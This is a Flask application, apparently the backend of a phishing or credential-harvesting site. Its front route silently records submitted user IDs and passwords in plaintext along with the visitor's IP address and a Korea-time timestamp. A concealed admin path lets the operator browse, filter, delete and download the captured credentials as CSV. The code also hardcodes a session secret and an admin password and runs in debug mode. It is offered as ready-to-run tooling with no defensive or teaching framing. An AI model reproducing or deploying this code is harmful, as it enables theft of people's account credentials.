from flask import Flask, render_template, request, redirect, url_for, send_file, session
from flask_sqlalchemy import SQLAlchemy
import csv
import os
import uuid
from datetime import datetime
import pytz
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)
app.secret_key = 'very_secret_key_for_session'

# ProxyFix 미들웨어 적용
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DB_PATH = os.path.join(BASE_DIR, 'data', 'log.db')
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

ADMIN_PASSWORD = 'tlfldi11'

kst = pytz.timezone('Asia/Seoul')

class Log(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(36), nullable=False)
    user_id = db.Column(db.String(100), nullable=False)
    user_pw = db.Column(db.String(100), nullable=False)
    ip = db.Column(db.String(50), nullable=False)
    time = db.Column(db.DateTime, nullable=False)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user_id = request.form.get('id')
        user_pw = request.form.get('pw')
        user_ip = get_client_ip()

        now_utc = datetime.utcnow().replace(tzinfo=pytz.utc)
        now_kst = now_utc.astimezone(kst)

        new_log = Log(
            uuid=str(uuid.uuid4()),
            user_id=user_id,
            user_pw=user_pw,
            ip=user_ip,
            time=now_kst
        )
        db.session.add(new_log)
        db.session.commit()
        return '', 204
    return render_template('index.html')

@app.route('/QkdQKdadmin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        pw = request.form.get('pw')
        if pw == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
        return render_template('admin_login.html', error='비밀번호가 틀렸습니다.')
    return render_template('admin_login.html')

@app.route('/QkdQKdadmin/panel', endpoint='admin_panel')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    records = Log.query.all()
    search_id = request.args.get('search_id', '').strip()
    search_ip = request.args.get('search_ip', '').strip()
    search_date = request.args.get('search_date', '').strip()
    sort = request.args.get('sort', 'time')
    page = int(request.args.get('page', 1))
    per_page = 20

    if search_id:
        records = [r for r in records if search_id in r.user_id]
    if search_ip:
        records = [r for r in records if search_ip in r.ip]
    if search_date:
        records = [r for r in records if r.time.strftime('%Y-%m-%d').startswith(search_date)]

    if sort == 'id':
        records.sort(key=lambda x: x.user_id)
    else:
        records.sort(key=lambda x: x.time, reverse=True)

    total = len(records)
    start = (page - 1) * per_page
    end = start + per_page
    page_range = range(1, (total - 1) // per_page + 2)

    for r in records:
        r.time = r.time.strftime('%Y-%m-%d %H:%M:%S')

    return render_template('admin.html', records=records[start:end], page_range=page_range, current_page=page, request=request)

@app.route('/QkdQKdadmin/delete_selected', methods=['POST'])
def delete_selected():
    pw = request.form.get('admin_pw')
    if pw != ADMIN_PASSWORD:
        return '잘못된 접근입니다.', 403
    delete_ids = request.form.getlist('delete_ids')
    for delete_id in delete_ids:
        log = Log.query.filter_by(uuid=delete_id).first()
        if log:
            db.session.delete(log)
    db.session.commit()
    return redirect(url_for('admin_panel'))

@app.route('/QkdQKdadmin/delete_all', methods=['POST'])
def delete_all():
    pw = request.form.get('admin_pw')
    if pw != ADMIN_PASSWORD:
        return '잘못된 접근입니다.', 403
    Log.query.delete()
    db.session.commit()
    return redirect(url_for('admin_panel'))

@app.route('/QkdQKdadmin/download')
def download():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    records = Log.query.all()
    filename = 'log_download.csv'
    with open(filename, 'w', newline='', encoding='utf-8-sig') as f:
        writer = csv.writer(f)
        writer.writerow(['아이디', '비밀번호', 'IP', '시간'])
        for r in records:
            writer.writerow([r.user_id, r.user_pw, r.ip, r.time.strftime('%Y-%m-%d %H:%M:%S')])
    return send_file(filename, as_attachment=True)

@app.route('/QkdQKdadmin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    os.makedirs('data', exist_ok=True)
    with app.app_context():
        db.create_all()
    app.run(debug=True)
